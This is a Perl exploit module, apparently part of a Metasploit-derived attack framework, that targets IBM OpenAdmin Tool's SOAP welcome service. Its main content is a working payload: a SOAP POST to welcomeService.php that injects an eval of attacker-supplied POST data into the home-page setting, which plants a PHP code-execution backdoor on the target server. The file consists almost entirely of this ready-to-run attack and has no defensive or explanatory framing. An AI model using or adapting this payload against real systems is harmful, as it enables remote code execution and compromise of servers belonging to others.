MSFPerlExploits/IBM/MSF/OpenadminToolSoapWelcomeserverExec.pm

package MSFPerlExploits::IBM::MSF::OpenadminToolSoapWelcomeserverExec;
use parent qw(P1rK3r::Exploit P1rK3r::Services::IBM);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "OpenadminToolSoapWelcomeserverExec";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'OpenadminToolSoapWelcomeserverExec',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'services/welcome/welcomeService.php',
                        PAYLOAD      => '<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:urn='urn:Welcome' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><soapenv:Header/><soapenv:Body><urn:saveHomePage soapenv:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'><new_home_page xsi:type='xsd:string'>&quot;;eval($_POST[&apos;pgawjuVVFRuXfT&apos;]); #</new_home_page></urn:saveHomePage></soapenv:Body></soapenv:Envelope>',
                        TEXT         => 'Sending First Exploit Request On : /services/welcome/welcomeService.php',
                        HEADERS      => {
                           'SOAPAction' => 'urn:QBEAction',
                           'Content-Type' => 'text/xml; charset=UTF-8',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;